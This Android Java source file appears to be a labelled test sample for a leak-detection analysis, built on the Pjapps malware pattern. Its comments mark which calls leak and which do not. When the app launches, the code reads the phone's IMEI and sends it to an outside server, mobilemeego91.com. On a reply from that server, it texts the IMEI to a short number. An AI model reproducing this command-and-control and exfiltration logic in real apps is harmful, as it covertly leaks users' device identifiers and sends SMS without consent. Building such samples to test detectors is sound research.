package fu.hao.pjapps;

import android.content.Context;
import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId();
        // String str2 = "http://" + Base64.encodebook("2maodb3ialke8mdeme3gkos9g1icaofm", 6, 3) + "/mm.do?imei=" + imei;
        SmsManager sms = SmsManager.getDefault();
        int i = 0;
        if (imei != null) {
            i = 1;
        }

        if (i != 0) {
            String str2 = "http://mobilemeego91.com" + "/mm.do?imei=" + imei;
            try {

                str2 = BaseAuthenicationHttpClient.getStringByURL(str2);
                if (str2 != null && !"".equals(str2)) {
                    if ("no".equalsIgnoreCase(str2)) { // command
                        sms.sendTextMessage("+49", null, imei, null, null);  //controlled api, leak
                    }
                }

                sms.sendTextMessage("+86", null, null, null, null);  //non-controlled api, non-leak
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public void testCtx() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId();
        // String str2 = "http://" + Base64.encodebook("2maodb3ialke8mdeme3gkos9g1icaofm", 6, 3) + "/mm.do?imei=" + imei;
        int i = 0;
        if (imei.equals("30")) {
            i = 1;
        }

        if (i != 0) {
            String str2 = "http://mobilemeego91.com" + "/mm.do?imei=" + imei;
            try {
                HttpURLConnection localHttpURLConnection = (HttpURLConnection) new URL(str2).openConnection();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }


    public void testInfluence() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId();
        // String str2 = "http://" + Base64.encodebook("2maodb3ialke8mdeme3gkos9g1icaofm", 6, 3) + "/mm.do?imei=" + imei;
        SmsManager sms = SmsManager.getDefault();

        String str2 = "http://mobilemeego91.com" + "/mm.do?imei=" + imei;
        try {
            str2 = BaseAuthenicationHttpClient.getStringByURL(str2);
            if (str2 != null && !"".equals(str2)) {
                if ("no".equalsIgnoreCase(str2)) { // command
                    sms.sendTextMessage("+49", null, imei, null, null);  //controlled api, leak
                }
            }

            sms.sendTextMessage("+86", null, null, null, null);  //non-controlled api, non-leak
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
